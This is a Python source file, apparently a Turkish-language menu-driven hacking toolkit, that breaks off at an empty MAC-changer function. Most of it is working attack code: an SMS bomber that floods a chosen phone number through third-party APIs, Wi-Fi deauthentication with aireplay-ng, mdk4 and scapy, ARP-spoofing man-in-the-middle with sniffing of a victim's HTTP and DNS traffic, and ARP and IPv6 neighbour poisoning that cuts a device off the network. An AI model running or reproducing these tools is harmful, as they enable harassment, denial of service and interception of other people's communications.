import platform, os, subprocess, time, socket, threading, json, urllib.request, random, sys, warnings, logging

logging.getLogger("scapy").setLevel(logging.ERROR)
warnings.filterwarnings("ignore", message="No libpcap")
warnings.filterwarnings("ignore", message="L3WinSocket")

try:
    import colorama
    colorama.init()
except ImportError:
    pass

if platform.system() == "Windows":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

OS = platform.system()
Root = None
System = None
Location = "Home"

K = "\033[1;31m"; Y = "\033[1;33m"; M = "\033[1;35m"; C = "\033[1;36m"
G = "\033[1;32m"; W = "\033[1;37m"; R = "\033[1;31m"; S = "\033[0m"
B = "\033[1;34m"

if OS == "Windows":
    import ctypes
    System = "Windows"
    Root = ctypes.windll.shell32.IsUserAnAdmin() != 0
elif OS == "Linux":
    System = "Linux"
    Root = os.geteuid() == 0
elif OS == "Darwin":
    System = "Mac OS"
    Root = os.geteuid() == 0
else:
    System = "Unknown"
    Root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False

def clear_screen():
    subprocess.call("cls" if OS == "Windows" else "clear", shell=True)

def bekle(s=1.5):
    time.sleep(s)

def cizgi():
    print(f"  {M}{'─'*50}{S}")

def baslik(txt):
    print(f"\n  {Y}{'›'*3} {txt.upper()} {'‹'*3}{S}\n")

def info(m):
    print(f"{C}  \u25B2{S} {m}")

def ok(m):
    print(f"{G}  \u2713{S} {m}")

def fail(m):
    print(f"{R}  \u2717{S} {m}")

def warn(m):
    print(f"{Y}  \u26A0{S} {m}")

def soru(prompt, default=None):
    if default is not None and default != "":
        g = input(f"  {W}{prompt}{S} {Y}[{default}]:{S} ")
    else:
        g = input(f"  {W}{prompt}{S} ")
    if g.strip() == "0":
        return None
    if g.strip() == "" and default is not None and default != "":
        return default
    if g.strip() == "":
        return None
    return g.strip()

def secim_menu(ops):
    print()
    for k, v in ops:
        renk = R if k == "0" else M
        print(f"  {renk}[{k}]{S} {v}")
    return input(f"\n  {W}>{S} ")

def durum_cubugu():
    root_str = f"{G}ROOT{S}" if Root else f"{R}USER{S}"
    print(f"  {B}[{S} {root_str} {B}|{S} {System} {B}|{S} {tespit_arayuz()} {B}]{S}")

def tespit_arayuz():
    if System == "Linux":
        try:
            arayuzler = os.listdir("/sys/class/net/")
            for oncelikli in ["wlan0", "wlan1", "eth0", "ens33", "enp0s3"]:
                if oncelikli in arayuzler:
                    return oncelikli
            return arayuzler[0] if arayuzler else "wlan0"
        except:
            return "wlan0"
    elif System == "Windows":
        try:
            r = subprocess.run(["wmic", "nic", "get", "NetConnectionID"], capture_output=True, text=True, timeout=5)
            satirlar = [s.strip() for s in r.stdout.split("\n") if s.strip() and "NetConnectionID" not in s and s.strip()]
            for oncelikli in ["Wi-Fi", "WiFi", "Ethernet"]:
                for s in satirlar:
                    if oncelikli.lower() in s.lower():
                        return s
            return satirlar[0] if satirlar else "Ethernet"
        except:
            return "Ethernet"
    return "eth0"

def sor_arayuz():
    default = tespit_arayuz()
    g = soru(f"Arayuz (0=iptal)", default)
    return g if g else None

def gateway_bul():
    if System == "Windows":
        for deneme in [
            ["ipconfig"],
            ["route", "print", "0.0.0.0"],
            ["netsh", "interface", "ip", "show", "config"],
            ["powershell", "-c", "(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop"],
        ]:
            try:
                r = subprocess.run(deneme, capture_output=True, text=True, timeout=5)
                for satir in r.stdout.split("\n"):
                    s = satir.lower()
                    ip_src = None
                    if "default gateway" in s or "varsay" in s or "ag gecidi" in s:
                        for b in satir.split(":"):
                            b = b.strip()
                            if b.count(".") == 3 and all(p.isdigit() for p in b.split(".")):
                                ip_src = b
                    if "0.0.0.0" in satir:
                        b = satir.split()
                        for i, k in enumerate(b):
                            if k.count(".") == 3 and all(p.isdigit() for p in k.split(".")):
                                if b[i-1] == "0.0.0.0" if i > 0 else False:
                                    ip_src = k
                    if ip_src:
                        parts = ip_src.split(".")
                        if len(parts) == 4 and all(0 <= int(p) <= 255 for p in parts):
                            return ip_src
            except:
                pass
        try:
            r = subprocess.run(["ping", "-n", "1", "-w", "500", "192.168.1.1"], capture_output=True, timeout=3)
            if r.returncode == 0:
                return "192.168.1.1"
        except:
            pass
        return ""
    else:
        try:
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            b = r.stdout.split()
            for i, k in enumerate(b):
                if k == "via" and i + 1 < len(b):
                    return b[i + 1]
        except:
            pass
        return "192.168.1.1"

def tablo(baslik_liste, satirlar):
    kolon_say = len(baslik_liste)
    genislikler = [len(h) for h in baslik_liste]
    for s in satirlar:
        for i in range(min(len(s), kolon_say)):
            genislikler[i] = max(genislikler[i], len(str(s[i])) + 2)
    fmt = "  ".join(f"{{:<{w}}}" for w in genislikler)
    print(f"  {fmt.format(*baslik_liste)}")
    print(f"  {'  '.join('─'*w for w in genislikler)}")
    for s in satirlar:
        dolu = list(s) + [""] * (kolon_say - len(s))
        print(f"  {fmt.format(*dolu)}")

def sms_bomber():
    clear_screen(); baslik("SMS BOMBER")
    phone = soru("Telefon Numarasi (0=iptal)")
    if not phone: return "Home"
    adet = soru("Kac SMS (0=iptal)")
    if not adet: return "Home"
    try:
        adet = int(adet)
    except:
        fail("Gecersiz sayi!"); bekle(); return "Home"
    gecikme = soru("Gecikme (saniye, oneri 1-3)", "2")
    try:
        gecikme = float(gecikme)
    except:
        gecikme = 2
    thread_s = soru("Es zamanli thread sayisi", "3")
    try:
        thread_s = int(thread_s)
    except:
        thread_s = 3
    api_list = [
        {"url": "https://textbelt.com/text", "key": "textbelt"},
        {"url": "https://api.callmebot.com/whatsapp.php", "key": None},
        {"url": "https://www.fast2sms.com/dev/bulkV2", "key": None},
    ]
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    ]

    def rastgele_mesaj():
        t = random.choice([
            "Merhaba! Ucretsiz mesaj testi", "Naber? Bu bir test mesajidir.",
            "AHT SMS Bomber test mesaji", "Dogrulama kodunuz: {k}",
            "Selam, bu mesaj AHT uzerinden gonderilmistir.", "Kod: {k} - AHT uyarisi",
        ])
        return t.format(k=random.randint(100000, 999999))

    info(f"Hedef: {phone} | {adet} SMS | {gecikme}s | {thread_s} thread")
    warn("Gonderiliyor... (CTRL+C durdurur)\n")
    basarili = basarisiz = sira = 0
    kilit, sira_kilit = threading.Lock(), threading.Lock()

    def sms_gonder_thread():
        nonlocal basarili, basarisiz, sira
        while True:
            with sira_kilit:
                if sira >= adet: return
                sira += 1
                no = sira
            api = random.choice(api_list)
            mesaj = rastgele_mesaj()
            headers = {"User-Agent": random.choice(ua_list), "Content-Type": "application/json", "Accept": "application/json"}
            try:
                veri = {"phone": phone, "message": mesaj}
                if api["key"]: veri["key"] = api["key"]
                req = urllib.request.Request(api["url"], data=json.dumps(veri).encode(), headers=headers, method="POST")
                with urllib.request.urlopen(req, timeout=10) as r:
                    sonuc = json.loads(r.read().decode())
                with kilit:
                    if sonuc.get("success"):
                        basarili += 1; print(f"{G}  \u2713{S} #{no} Gonderildi")
                    else:
                        basarisiz += 1; print(f"{R}  \u2717{S} #{no} Hata: {sonuc.get('error','red')}")
            except:
                with kilit:
                    basarisiz += 1; print(f"{C}  \u25B2{S} #{no} API yanit vermedi")
            if gecikme > 0:
                time.sleep(gecikme + random.uniform(-0.3, 0.3))

    threads = []
    for _ in range(thread_s):
        t = threading.Thread(target=sms_gonder_thread, daemon=True)
        t.start(); threads.append(t)
    try:
        for t in threads: t.join()
    except KeyboardInterrupt:
        warn("Durduruldu.")
    print(); ok(f"Basarili: {basarili} / Basarisiz: {basarisiz}")
    input(f"\n  {Y}ENTER{S} "); return "Home"

def wifi_deauth():
    clear_screen(); baslik("WI-FI DEAUTH ATTACK")
    if System == "Windows":
        fail("Linux gerekli!"); input(f"  {Y}ENTER{S} "); return "Home"
    if not Root:
        fail("Root gerekli! sudo ile calistirin."); input(f"  {Y}ENTER{S} "); return "Home"
    secim = secim_menu([("1","Aircrack-ng (aireplay-ng)"), ("2","MDK4"), ("3","Scapy Deauth"), ("0","Geri")])
    if secim == "0": return "Home"
    sudo = "" if System == "Windows" else "sudo "
    interface = sor_arayuz()
    if not interface: return "Home"
    bssid = soru("Hedef BSSID (0=iptal)")
    if not bssid: return "Home"
    if secim == "1":
        info(f"Monitor mode baslatiliyor ({interface})...")
        os.system(f"{sudo}airmon-ng start {interface}")
        os.system(f"{sudo}aireplay-ng -0 0 -a {bssid} {interface}mon")
    elif secim == "2":
        os.system(f"{sudo}mdk4 {interface} d -a {bssid}")
    elif secim == "3":
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            os.system(f"{sudo}airmon-ng start {interface}")
            p = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(p, iface=interface+"mon", count=500, inter=0.1, verbose=0)
            os.system(f"{sudo}airmon-ng stop {interface}mon")
        except ImportError:
            fail("scapy kurulu degil! pip install scapy")
        except PermissionError:
            fail("Root yetkisi gerekli!")
        except KeyboardInterrupt:
            ok("Durduruldu.")
    input(f"  {Y}ENTER{S} "); return "Home"

def ag_tara(interface, ip_araligi):
    from ipaddress import ip_network, ip_address
    cihazlar = []; gorulen = set()

    def ekle(ip, mac):
        if ip in gorulen or mac.count(":") != 5: return
        try:
            a = ip_address(ip)
            if a.is_multicast or a.is_loopback or ip.endswith(".255"): return
        except:
            return
        gorulen.add(ip); cihazlar.append({"ip": ip, "mac": mac})

    try:
        from scapy.all import ARP, Ether, srp
        ag = ip_network(ip_araligi, strict=False)
        r = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ag)), iface=interface, timeout=5, verbose=0)[0]
        for g, a in r: ekle(a.psrc, a.hwsrc)
        return cihazlar
    except:
        pass
    try:
        sonuc = subprocess.run(["arp", "-a"] if System == "Windows" else ["arp", "-a", "-n"], capture_output=True, text=True)
        for satir in sonuc.stdout.split("\n"):
            b = satir.split()
            if len(b) >= 3 and "." in b[0]:
                ip = b[0]; mac = b[1].replace("-", ":")
                if mac.count(":") == 5: ekle(ip, mac)
    except:
        pass
    return cihazlar

def getmac(ip, interface=None):
    try:
        from scapy.all import ARP, Ether, srp
        r = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=interface, timeout=3, verbose=0)[0]
        if r: return r[0][1].hwsrc
    except:
        pass
    if System == "Windows":
        r = subprocess.run(["arp", "-a", ip], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if ip in satir:
                for b in satir.split():
                    if "-" in b and len(b.replace("-","")) == 12: return b.replace("-", ":")
                    if ":" in b and len(b.replace(":","")) == 12: return b
    else:
        r = subprocess.run(["arp", "-n", ip], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if ip in satir:
                for b in satir.split():
                    if ":" in b and len(b.replace(":","")) == 12: return b
    info(f"{ip} icin MAC bulunamadi, ping atiliyor...")
    subprocess.run(["ping", "-n", "1", ip] if System == "Windows" else ["ping", "-c", "1", ip], capture_output=True, timeout=3)
    time.sleep(0.5)
    if System == "Windows":
        r = subprocess.run(["arp", "-a", ip], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if ip in satir:
                for b in satir.split():
                    if "-" in b and len(b.replace("-","")) == 12: return b.replace("-", ":")
    return None

def kendi_mac_al(interface):
    if System == "Linux":
        try:
            with open(f"/sys/class/net/{interface}/address") as f: return f.read().strip()
        except:
            pass
    elif System == "Windows":
        for cmd in [
            ["wmic", "nic", "where", f'NetConnectionID="{interface}"', "get", "MACAddress"],
            ["getmac", "/FO", "CSV", "/NH"],
        ]:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                for satir in r.stdout.split("\n"):
                    mac = satir.strip().strip('"').split(",")[0]
                    if "-" in mac and len(mac) == 17: return mac.replace("-", ":")
            except:
                pass
        r = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if "Physical Address" in satir or "Fiziksel Adres" in satir:
                mac = satir.split(":")[-1].strip()
                if "-" in mac: return mac.replace("-", ":")
    return "00:11:22:33:44:55"

def arp_gonder(h_ip, h_mac, k_ip, k_mac, iface):
    try:
        from scapy.all import ARP, Ether, sendp
        sendp(Ether(dst=h_mac) / ARP(op=2, pdst=h_ip, hwdst=h_mac, psrc=k_ip, hwsrc=k_mac), iface=iface, verbose=0)
        return True
    except:
        pass
    if System == "Windows":
        for cmd in [
            ["netsh", "interface", "ip", "set", "neighbors", iface, h_ip, h_mac.replace(":","-")],
            ["arp", "-s", h_ip, h_mac.replace(":","-")],
        ]:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if r.returncode == 0: return True
            except:
                pass
    else:
        try:
            r = subprocess.run(["arp", "-s", h_ip, h_mac.replace(":","-")], capture_output=True, text=True, timeout=5)
            if r.returncode == 0: return True
        except:
            pass
    return False

def ip_forward(aktif=True):
    if System != "Linux": return
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1" if aktif else "0")
    except:
        pass

def ipv6_zehirle(hedef_mac, interface):
    ipv6_list = []
    try:
        if System == "Windows":
            r = subprocess.run(["netsh", "interface", "ipv6", "show", "neighbors"], capture_output=True, text=True, timeout=5)
            for satir in r.stdout.split("\n"):
                if hedef_mac.replace(":", "-")[:8].lower() in satir.lower():
                    for b in satir.split():
                        if b.count(":") >= 5 and "fe80" in b.lower():
                            ipv6_list.append(b.strip()); break
        else:
            r = subprocess.run(["ip", "-6", "neigh", "show"], capture_output=True, text=True, timeout=5)
            for satir in r.stdout.split("\n"):
                if hedef_mac.lower() in satir.lower():
                    b = satir.split()
                    if b and "fe80" in b[0].lower(): ipv6_list.append(b[0])
    except:
        pass
    if not ipv6_list: return []
    for ipv6 in ipv6_list:
        try:
            if System == "Windows":
                subprocess.run(["netsh", "interface", "ipv6", "set", "neighbors", interface, ipv6, "00-00-00-00-00-00"], capture_output=True, timeout=5)
            else:
                subprocess.run(["ip", "-6", "neigh", "replace", ipv6, "dev", interface, "lladdr", "00:00:00:00:00:00", "nud", "stale"], capture_output=True, timeout=5)
        except:
            pass
    return ipv6_list

def ipv6_temizle(ipv6_list, interface):
    for ipv6 in ipv6_list:
        try:
            if System == "Windows":
                subprocess.run(["netsh", "interface", "ipv6", "delete", "neighbors", interface, ipv6], capture_output=True, timeout=5)
            else:
                subprocess.run(["ip", "-6", "neigh", "del", ipv6, "dev", interface], capture_output=True, timeout=5)
        except:
            pass

def arayuz_ip(interface):
    if System == "Windows":
        for deneme in [
            ["route", "print", "0.0.0.0"],
            ["netsh", "interface", "ip", "show", "config"],
            ["ipconfig"],
            ["powershell", "-c", "(Get-NetIPAddress -AddressFamily IPv4 | Where InterfaceIndex -eq (Get-NetRoute -DestinationPrefix '0.0.0.0/0').InterfaceIndex).IPAddress"],
        ]:
            try:
                r = subprocess.run(deneme, capture_output=True, text=True, timeout=5)
                if "route" in deneme[0]:
                    for satir in r.stdout.split("\n"):
                        if "0.0.0.0" in satir and satir.strip().startswith("0.0.0.0"):
                            b = satir.split()
                            if len(b) >= 4 and b[3].count(".") == 3:
                                return b[3]
                elif "netsh" in deneme[0]:
                    import re
                    for p in [r"IP Address:\s+(\d+\.\d+\.\d+\.\d+)", r"IP Adresi:\s+(\d+\.\d+\.\d+\.\d+)"]:
                        m = re.search(p, r.stdout)
                        if m: return m.group(1)
                elif "ipconfig" in deneme[0]:
                    for satir in r.stdout.split("\n"):
                        if "IPv4" in satir and ":" in satir:
                            ip = satir.split(":")[-1].strip()
                            if ip.count(".") == 3:
                                return ip
                else:
                    ip = r.stdout.strip()
                    if ip.count(".") == 3:
                        return ip
            except:
                pass
    else:
        try:
            r = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True, timeout=5)
            for satir in r.stdout.split("\n"):
                if "inet " in satir:
                    return satir.strip().split()[1].split("/")[0]
        except:
            pass
    return None

def trafik_izle(hedef_ip, interface, duration=999999):
    ok(f"Hedef ({hedef_ip}) trafigi izleniyor... ({interface})")
    info("Her IP paketi ve TCP baglantisi listelenecek.")
    warn("CTRL+C ile durdurun\n")

    def hedef_baglantilar(ip):
        try:
            r = subprocess.run(["netstat", "-n"], capture_output=True, text=True, timeout=5)
            bag = []
            for satir in r.stdout.split("\n"):
                if "ESTABLISHED" in satir or "TIME_WAIT" in satir or "CLOSE_WAIT" in satir:
                    if ip in satir:
                        b = satir.split()
                        if len(b) >= 4:
                            bag.append(f"{b[1]} -> {b[2]} ({b[3]})")
            return bag
        except:
            return []

    if System == "Windows":
        ip_eng = arayuz_ip(interface)
        if not ip_eng:
            fail("Arayuz IP bulunamadi!"); return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            s.bind((ip_eng, 0))
            s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            s.settimeout(1)
            basla = time.time(); toplam = 0; son_ozet = 0
            while True:
                try:
                    pkt = s.recv(65535)
                    ip_baslik = pkt[14:34] if len(pkt) > 34 else b""
                    if len(ip_baslik) < 20: continue
                    ip_src = ".".join(str(b) for b in ip_baslik[12:16])
                    ip_dst = ".".join(str(b) for b in ip_baslik[16:20])
                    if ip_src != hedef_ip and ip_dst != hedef_ip: continue
                    toplam += 1
                    proto = ip_baslik[9]
                    yon = f"{G}{ip_src}{S} -> {C}{ip_dst}{S}" if ip_src == hedef_ip else f"{C}{ip_src}{S} -> {G}{ip_dst}{S}"
                    src_port = dst_port = "?"
                    if proto == 6 and len(pkt) >= 48:
                        src_port = (pkt[34] << 8) | pkt[35]
                        dst_port = (pkt[36] << 8) | pkt[37]
                        flags = pkt[47]
                        syn = " [SYN]" if (flags & 0x02) else ""
                        prot = "TCP"
                    elif proto == 17 and len(pkt) >= 42:
                        src_port = (pkt[34] << 8) | pkt[35]
                        dst_port = (pkt[36] << 8) | pkt[37]
                        syn = ""
                        prot = "UDP"
                    else:
                        syn = ""
                        prot = f"IP({proto})"
                    print(f"  {W}[{prot}]{S} {yon}:{dst_port}{syn}")

                    if proto == 6 and len(pkt) > 54:
                        try:
                            yuk = pkt[54:].decode("utf-8", errors="ignore")
                            for satir in yuk.split("\n"):
                                s2 = satir.strip()
                                if s2.startswith("GET ") or s2.startswith("POST ") or s2.startswith("Host:") or s2.startswith("CONNECT "):
                                    print(f"    {G}HTTP>{S} {s2[:100]}")
                                    break
                        except:
                            pass

                    if time.time() - son_ozet >= 15:
                        son_ozet = time.time()
                        bag = hedef_baglantilar(hedef_ip)
                        if bag:
                            print(f"  {M}── Baglantilar ──{S}")
                            for b in bag[:5]:
                                print(f"    {b}")
                            if len(bag) > 5:
                                print(f"    ...+{len(bag)-5} daha")

                except socket.timeout:
                    if time.time() - basla > 30 and toplam == 0:
                        print(f"  {Y}!{S} Paket yakalanamadi. IP forwarding aktif mi? Hedef cihaz calisiyor mu?")
                        basla = time.time()
                except:
                    pass
            s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            s.close()
        except PermissionError:
            fail("Yonetici yetkisi gerekli!")
        except Exception as e:
            fail(f"Hata: {e}")
    else:
        try:
            from scapy.all import sniff
            def analiz(p):
                if not p.haslayer("IP"): return
                ip = p["IP"]
                if ip.src != hedef_ip and ip.dst != hedef_ip: return
                if p.haslayer("TCP"):
                    tcp = p["TCP"]
                    syn = " [SYN]" if tcp.flags & 0x02 else ""
                    yon = f"{G}{ip.src}{S}->{C}{ip.dst}{S}:{tcp.dport}" if ip.src == hedef_ip else f"{C}{ip.src}{S}->{G}{ip.dst}{S}:{tcp.sport}"
                    print(f"  {W}[TCP]{S} {yon}{syn}")
                    if p.haslayer("Raw"):
                        try:
                            yuk = p["Raw"].load.decode("utf-8", errors="ignore")
                            for satir in yuk.split("\n"):
                                s2 = satir.strip()
                                if s2.startswith("GET ") or s2.startswith("POST ") or s2.startswith("Host:") or s2.startswith("CONNECT "):
                                    print(f"    {G}HTTP>{S} {s2[:100]}")
                                    break
                        except:
                            pass
                if p.haslayer("UDP") and p["UDP"].dport == 53 and p.haslayer("DNSQR"):
                    print(f"  {W}[DNS]{S} {G}{ip.src}{S} -> {C}{p['DNSQR'].qname.decode()}{S}")
            sniff(iface=interface, prn=analiz, store=0, timeout=duration)
        except ImportError:
            fail("scapy gerekli! pip install scapy")
        except PermissionError:
            fail("Root gerekli!")
        except Exception as e:
            fail(f"Hata: {e}")

def arp_spoof(hedef_ip, gateway_ip, interface):
    hedef_mac = getmac(hedef_ip, interface)
    gateway_mac = getmac(gateway_ip, interface)
    if not hedef_mac or not gateway_mac:
        fail("MAC bulunamadi!"); return
    benim_mac = kendi_mac_al(interface)
    ok(f"MITM basladi: {hedef_ip} <-> {gateway_ip}")
    ok(f"Trafik sizin uzerinizden gececek ({benim_mac})")
    ip_forward(True)
    warn("CTRL+C ile durdurun\n")
    spoof_aktif = True

    def spoof_loop():
        while spoof_aktif:
            arp_gonder(hedef_ip, hedef_mac, gateway_ip, benim_mac, interface)
            arp_gonder(gateway_ip, gateway_mac, hedef_ip, benim_mac, interface)
            time.sleep(1)

    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    trafik_izle(hedef_ip, interface, duration=999999)
    spoof_aktif = False
    ok("ARP tablolari geri yukleniyor...")
    arp_gonder(hedef_ip, hedef_mac, gateway_ip, gateway_mac, interface)
    arp_gonder(gateway_ip, gateway_mac, hedef_ip, hedef_mac, interface)
    if System == "Windows":
        subprocess.run(["arp", "-d", hedef_ip], capture_output=True)
        subprocess.run(["arp", "-d", gateway_ip], capture_output=True)
    ok("Temizlendi.")

def baglanti_kes(hedef_ip, gateway_ip, interface):
    hedef_mac = getmac(hedef_ip, interface)
    if not hedef_mac:
        fail("MAC bulunamadi!"); return
    benim_mac = kendi_mac_al(interface)
    gateway_mac = getmac(gateway_ip, interface)
    info(f"Hedef: {hedef_mac} | Gateway: {gateway_mac or '?'} | Ben: {benim_mac}")
    ip_forward(False)
    ipv6_list = ipv6_zehirle(hedef_mac, interface)
    warn("Zehirleme basladi - Hedefin interneti kesilecek.")
    warn("CTRL+C ile durdurun.\n")
    sayac = 0
    kes_aktif = True

    def zehirle():
        nonlocal sayac
        while kes_aktif:
            arp_gonder(hedef_ip, hedef_mac, gateway_ip, benim_mac, interface)
            if gateway_mac:
                arp_gonder(gateway_ip, gateway_mac, hedef_ip, benim_mac, interface)
            sayac += 1; time.sleep(0.5)

    t = threading.Thread(target=zehirle, daemon=True)
    t.start()

    try:
        while kes_aktif:
            time.sleep(10)
            baglanti = hedef_baglantilar(hedef_ip)
            warn(f"HEDEF KOPUYOR ({sayac} ARP) | {hedef_ip} baglantilari:")
            if baglanti:
                for b in baglanti:
                    print(f"{R}  \u2717{S} {b['yerel']} <-> {b['uzak']} ({b['durum']})")
            else:
                ok("Hedefin aktif baglantisi yok (koptu!).")
            print()
    except KeyboardInterrupt:
        kes_aktif = False
        ok("Durduruldu.")
    ok("Geri yukleniyor...")
    if gateway_mac:
        arp_gonder(hedef_ip, hedef_mac, gateway_ip, gateway_mac, interface)
        arp_gonder(gateway_ip, gateway_mac, hedef_ip, hedef_mac, interface)
    if System == "Windows":
        subprocess.run(["arp", "-d", hedef_ip], capture_output=True)
        subprocess.run(["arp", "-d", gateway_ip], capture_output=True)
    ipv6_temizle(ipv6_list, interface)
    ok("Hedef normal baglantiya dondu.")

def paket_yakala(interface, adet=50):
    try:
        from scapy.all import sniff
    except ImportError:
        fail("scapy kurulu degil! pip install scapy"); return
    ok(f"Dinleniyor ({interface}, {adet} paket)... CTRL+C durdurur\n")
    s = {"http": 0, "dns": 0, "arp": 0, "toplam": 0}

    def analiz(p):
        s["toplam"] += 1
        if p.haslayer("IP"):
            ip = p["IP"]
            if p.haslayer("TCP") and p.haslayer("Raw"):
                try:
                    y = p["Raw"].load.decode("utf-8", errors="ignore")
                    if "HTTP/" in y or "GET " in y or "POST " in y:
                        s["http"] += 1; print(f"{G}  HTTP{S} {ip.src} -> {ip.dst}: {y.split(chr(10))[0][:60]}")
                except:
                    pass
            if p.haslayer("UDP") and p["UDP"].dport == 53 and p.haslayer("DNSQR"):
                s["dns"] += 1; print(f"{C}  DNS{S} {ip.src} -> {p['DNSQR'].qname.decode()}")
        if p.haslayer("ARP"):
            s["arp"] += 1; a = p["ARP"]; print(f"{Y}  ARP{S} {a.psrc} -> {a.pdst}")

    try:
        sniff(iface=interface, prn=analiz, count=adet, store=0, timeout=30)
    except PermissionError:
        fail("Root gerekli!")
    except Exception as e:
        fail(f"Hata: {e}")
    print(f"\n{C}  OZET{S} HTTP:{s['http']} DNS:{s['dns']} ARP:{s['arp']} Toplam:{s['toplam']}")

def bagli_cihazlar():
    if System == "Linux":
        try:
            with open("/proc/net/arp") as f:
                satirlar = [s for s in f.read().strip().split("\n")[1:] if s.strip()]
        except:
            fail("ARP okunamiyor!"); return
        if not satirlar:
            info("ARP tablosu bos."); return
        rows = []
        for s in satirlar:
            b = s.split()
            if len(b) >= 4: rows.append((b[0], b[3], b[5] if len(b) > 5 else "?"))
        tablo(("IP", "MAC", "Arayuz"), rows)
    else:
        r = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        print(f"  {r.stdout.strip()}")

def internet_engelle(ip):
    if System == "Windows": fail("Linux gerekli!"); return
    if not Root: fail("Root gerekli!"); return
    os.system(f"sudo iptables -A FORWARD -s {ip} -j DROP")
    os.system(f"sudo iptables -A FORWARD -d {ip} -j DROP")
    ok(f"{ip} engellendi. [6]>[2] ile kaldirin.")

def internet_engel_kaldir(ip):
    if System == "Windows": return
    os.system(f"sudo iptables -D FORWARD -s {ip} -j DROP 2>/dev/null")
    os.system(f"sudo iptables -D FORWARD -d {ip} -j DROP 2>/dev/null")
    ok(f"{ip} engeli kaldirildi.")

def bettercap_menu():
    clear_screen(); baslik("NETWORK TOOLS"); durum_cubugu()
    if not Root and System == "Linux":
        fail("Bazi islemler root gerektirir.")
    secim = secim_menu([
        ("1","Ag Taramasi (cihaz bul)"), ("2","ARP Spoofing (MITM)"),
        ("3","HTTP/DNS Sniffing"), ("4","Bagli Cihazlar"), ("5","Baglantiyi Kes"),
        ("6","Internet Engelle/Kaldir"), ("0","Ana Menu"),
    ])
    if secim == "0": return "Home"
    interface = sor_arayuz()
    if not interface: return "Home"

    if secim == "1":
        ip_araligi = soru("IP araligi", "192.168.1.0/24")
        if not ip_araligi: return "Home"
        if "/" not in ip_araligi: ip_araligi = ".".join(ip_araligi.split(".")[:3]) + ".0/24"
        cihazlar = ag_tara(interface, ip_araligi)
        if cihazlar:
            ok(f"{len(cihazlar)} cihaz bulundu:")
            tablo(("IP", "MAC"), [(c["ip"], c["mac"]) for c in cihazlar])
        else:
            fail("Cihaz bulunamadi.")

    elif secim == "2":
        hedef_ip = soru("Hedef IP (0=iptal)")
        if not hedef_ip: return "Home"
        gateway_ip = soru("Gateway IP", gateway_bul())
        if not gateway_ip: return "Home"
        arp_spoof(hedef_ip, gateway_ip, interface)

    elif secim == "3":
        adet = soru("Paket sayisi", "50")
        try: adet = int(adet)
        except: adet = 50
        paket_yakala(interface, adet)

    elif secim == "4":
        bagli_cihazlar()

    elif secim == "5":
        hedef_ip = soru("Kesilecek cihaz IP (0=iptal)")
        if not hedef_ip: return "Home"
        gateway_ip = soru("Gateway IP", gateway_bul())
        if not gateway_ip: return "Home"
        baglanti_kes(hedef_ip, gateway_ip, interface)

    elif secim == "6":
        alt = secim_menu([("1","Engelle"), ("2","Kaldir"), ("0","Geri")])
        if alt == "0": return "Home"
        hedef_ip = soru("Cihaz IP (0=iptal)")
        if not hedef_ip: return "Home"
        internet_engelle(hedef_ip) if alt == "1" else internet_engel_kaldir(hedef_ip)

    else:
        fail("Gecersiz secim!"); bekle(); return "Home"
    input(f"  {Y}ENTER{S} "); return "Home"

def ip_geolocation():
    clear_screen(); baslik("IP GEOLOCATION")
    ip = soru("IP adresi (0=iptal)")
    if not ip: return "Home"
    info(f"{ip} sorgulaniyor...")
    try:
        req = urllib.request.Request(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            d = json.loads(r.read().decode())
        if d["status"] == "success":
            for k, v in [("Ulke", f"{d['country']} ({d['countryCode']})"), ("Sehir", d["city"]),
                         ("Bolge", d["regionName"]), ("ISP", d["isp"]), ("Enlem/Boylam", f"{d['lat']}/{d['lon']}"),
                         ("Zaman", d["timezone"])]:
                ok(f"{k}: {v}")
        else:
            fail(d.get("message", "Hata"))
    except Exception as e:
        fail(f"Baglanti: {e}")
    input(f"  {Y}ENTER{S} "); return "Home"

def port_scanner():
    clear_screen(); baslik("PORT SCANNER")
    hedef = soru("IP/Domain (0=iptal)")
    if not hedef: return "Home"
    info(f"{hedef} taranıyor (1-1024)...")
    open_ports = []
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
            if s.connect_ex((hedef, p)) == 0: open_ports.append(p)
            s.close()
        except: pass
    threads = [threading.Thread(target=scan, args=(p,), daemon=True) for p in range(1, 1025)]
    for t in threads: t.start()
    for t in threads: t.join()
    if open_ports:
        ok(f"{len(open_ports)} acik port:")
        rows = []
        for p in sorted(open_ports):
            try: svc = socket.getservbyport(p)
            except: svc = "?"
            rows.append((str(p), svc))
        tablo(("Port", "Servis"), rows)
    else:
        fail("Acik port bulunamadi.")
    input(f"  {Y}ENTER{S} "); return "Home"

def mac_changer():
